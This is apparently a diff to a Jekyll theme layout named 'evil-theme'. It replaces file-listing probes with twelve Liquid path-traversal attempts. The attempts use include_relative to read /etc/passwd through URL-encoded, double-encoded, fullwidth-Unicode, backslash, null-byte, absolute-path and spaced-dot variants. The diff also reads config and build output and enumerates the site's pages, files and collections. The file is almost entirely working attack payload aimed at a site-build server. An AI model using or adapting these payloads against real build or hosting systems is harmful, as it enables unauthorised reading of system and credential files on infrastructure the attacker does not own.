@@ -1,21 +1,59 @@
 <!DOCTYPE html>
 <html><body>
 {{ content }}
-<h2>Theme loaded from evil-theme</h2>
-<p>site.source: {{ site.source }}</p>
-<p>site.github.api_url: {{ site.github.api_url }}</p>
 
-<!-- Attempt to read files using Liquid -->
-{% for page in site.pages %}
-<div>Page: {{ page.path }} - {{ page.content | truncate: 200 }}</div>
+<h2>Path traversal bypass attempts</h2>
+
+<!-- 1. URL-encoded dots -->
+{% capture t1 %}{% include_relative %2e%2e/etc/passwd %}{% endcapture %}
+<pre>urlenc: {{ t1 }}</pre>
+
+<!-- 2. Double-encoded -->
+{% capture t2 %}{% include_relative %252e%252e/etc/passwd %}{% endcapture %}
+<pre>dblenc: {{ t2 }}</pre>
+
+<!-- 3. Unicode fullwidth dots -->
+{% capture t3 %}{% include_relative ．．/etc/passwd %}{% endcapture %}
+<pre>unicode: {{ t3 }}</pre>
+
+<!-- 4. Backslash instead of forward slash -->
+{% capture t4 %}{% include_relative ..\etc\passwd %}{% endcapture %}
+<pre>backslash: {{ t4 }}</pre>
+
+<!-- 5. Null byte -->
+{% capture t5 %}{% include_relative ..%00/etc/passwd %}{% endcapture %}
+<pre>null: {{ t5 }}</pre>
+
+<!-- 6. Just read files that exist in workspace -->
+{% capture t6 %}{% include_relative _config.yml %}{% endcapture %}
+<pre>config: {{ t6 }}</pre>
+
+<!-- 7. Try absolute path -->
+{% capture t7 %}{% include_relative /etc/passwd %}{% endcapture %}
+<pre>absolute: {{ t7 }}</pre>
+
+<!-- 8. Dot-dot with spaces/tabs -->
+{% capture t8 %}{% include_relative . ./etc/passwd %}{% endcapture %}
+<pre>spaces: {{ t8 }}</pre>
+
+<!-- 9. Try reading from _site output directory -->
+{% capture t9 %}{% include_relative _site/index.html %}{% endcapture %}
+<pre>site: {{ t9 }}</pre>
+
+<!-- 10. list all static files -->
+<h3>Static files in build:</h3>
+{% for f in site.static_files %}
+<div>{{ f.path }} ({{ f.extname }})</div>
 {% endfor %}
 
-{% for static_file in site.static_files %}
-<div>Static: {{ static_file.path }} {{ static_file.extname }}</div>
+<!-- 11. list all pages -->
+<h3>All pages:</h3>
+{% for p in site.pages %}
+<div>{{ p.path }}: {{ p.url }}</div>
 {% endfor %}
 
-<!-- Try to include from parent directory -->
-{% capture test %}{% include_relative ../Gemfile.lock %}{% endcapture %}
-<pre>{{ test }}</pre>
+<!-- 12. list all collections -->
+<h3>Collections:</h3>
+{{ site.collections | inspect }}
 
 </body></html>
